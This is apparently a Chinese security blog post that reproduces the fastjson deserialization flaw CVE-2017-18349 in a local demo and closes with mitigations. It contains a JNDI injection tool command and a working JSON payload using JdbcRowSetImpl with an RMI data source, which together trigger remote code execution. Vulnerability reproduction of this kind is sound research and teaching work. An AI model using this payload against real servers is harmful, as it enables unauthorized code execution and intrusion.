今天开始拿实际案例（CVE-2017-18349 ）来举例，老规矩，先描述

漏洞描述

CVE-2017-18349，前台无回显RCE，fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

影响版本

fastjson<=1.2.24

复现过程

首先本地起一个demo（感谢LiBuJie表哥写的代码，地址在这）

然后使用jndi注入工具起一个RMI服务

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A "127.0.0.1"   //本行的意思是起个计算器，都是本机的

正常请求返回：

打入poc

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://127.0.0.1:1099/2jvlig",    //这个是jndi注入工具的地址
        "autoCommit":true
    }
}

发送后成功弹出计算器


缓解措施

  1. 升级fastjson版本

  2. 上安全设备如waf、ips等
